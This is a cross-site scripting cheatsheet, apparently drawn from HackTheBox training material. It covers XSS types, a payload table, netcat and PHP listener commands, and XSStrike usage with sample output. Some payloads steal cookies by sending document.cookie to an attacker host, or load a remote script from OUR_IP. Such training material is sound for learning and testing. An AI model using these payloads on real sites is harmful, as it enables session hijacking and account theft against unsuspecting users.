---
title: 'XSS — Cross-Site Scripting Cheatsheet'
description: 'Types of XSS, payloads, tools, and detection techniques'
category: 'Web'
pubDate: '2026-07-09'
---

A typical web application works by receiving the HTML code from the back-end server and rendering it on the client-side internet browser. When a vulnerable web application does not properly sanitize user input, a malicious user can inject extra JavaScript code in an input field (e.g., comment/reply), so once another user views the same page, they unknowingly execute the malicious JavaScript code.

XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a medium risk (`low impact + high probability = medium risk`), which we should always attempt to reduce risk by detecting, remediating, and proactively preventing these types of vulnerabilities.

## Types of XSS

| Type | Description |
| ---- | ----------- |
| `Stored (Persistent) XSS` | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments) |
| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message) |
| `DOM-based XSS` | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |

## XSS Payloads

| Code | Description |
| ---- | ----------- |
| **XSS Payloads** |
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |
| **Commands** |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80` | Start `netcat` listener |
| `sudo php -S 0.0.0.0:80` | Start `PHP` server |

## Tools

Some of the common open-source tools: [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser)

#### XSS Strike
```shell-session
L3bnn@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
L3bnn@htb[/htb]$ cd XSStrike
L3bnn@htb[/htb]$ pip install -r requirements.txt
L3bnn@htb[/htb]$ python xsstrike.py

XSStrike v3.1.4
...SNIP...
```

```shell-session
L3bnn@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 

        XSStrike v3.1.4

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: task 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()> 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N]
```

### Manual Discovery
[PayloadAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)

## Blind XSS Detection

Blind XSS occurs when the payload is executed in a context that the attacker cannot directly observe (e.g., admin dashboard, logging page). Detection typically involves setting up a listener and using payloads that callback to your server.
